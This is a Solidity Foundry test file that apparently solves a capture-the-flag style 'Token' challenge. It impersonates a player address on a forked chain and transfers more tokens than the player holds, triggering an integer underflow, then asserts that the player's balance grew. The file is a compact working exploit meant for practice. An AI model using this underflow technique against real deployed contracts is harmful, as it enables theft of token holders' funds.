// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/Token.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../Token.sol";

contract TokenTest is DSTest {
    Token obj;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address contract_address;
    function setUp() public {
        // obj = new Token(20999980);        
        contract_address = 0x066BA674b7Ee98aA7C1eCc30343f5175CbEB6b25;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = Token(contract_address);
        // vm.record();
        // balances[msg.sender] = 20;
        // uint256 slot = keccak256(keccak256(msg.sender));        
        // vm.store(address(obj), bytes32(keccak256(abi.encode(msg.sender, 0))), bytes32(uint256(20)));
    }

    function testUnderflow() public {
        vm.startPrank(player_address);  
        console.log("Contract Address =", contract_address);
        console.log("initial balance =", obj.balanceOf(player_address));
        console.log("contract initial balance =", obj.balanceOf(contract_address));
        // (bool success, ) = address(fallout).call{value: msg.value}("Fal1out()");
        bool success = obj.transfer(contract_address, 21);
        require(success, "Failed Tx");
        console.log("end balance =", obj.balanceOf(player_address));
        console.log("contract end balance =", obj.balanceOf(contract_address));
        // (bytes32[] memory reads, bytes32[] memory writes) = vm.accesses(
        //     address(obj)
        // );
        // console.log("reads =", reads.length, "writes =", writes.length);
        // for(uint i;i < reads.length;i++) {
        //     emit log_uint(uint256(reads[i])); 
        // }
        // console.log("");
        // for(uint i;i < writes.length;i++) {
        //     emit log_uint(uint256(writes[i])); 
        // }
        
        // emit log_uint(uint256(writes[1])); 
        // emit log_uint(uint256(writes[2])); 
        // emit log_uint(uint256(writes[3])); 
        assert(obj.balanceOf(player_address) > 21);
        vm.stopPrank();
    }
}
